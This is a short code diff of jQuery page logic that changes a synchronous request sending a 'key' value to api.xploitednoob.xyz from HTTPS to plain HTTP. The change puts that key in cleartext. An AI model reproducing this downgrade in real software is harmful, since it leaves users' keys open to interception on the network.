@@ -124,7 +124,7 @@ $(document).ready(function() {
             document.getElementById("pba1").style.display = "block";
             document.getElementById("pba2").style.display = "block";
             $.ajaxSetup({async:false});
-            $.get('https://api.xploitednoob.xyz/app.js?key=' + key);
+            $.get('http://api.xploitednoob.xyz/app.js?key=' + key);
             var xhttp = new XMLHttpRequest();
             xhttp.onreadystatechange=function() {
                 if (this.readyState == 4) {
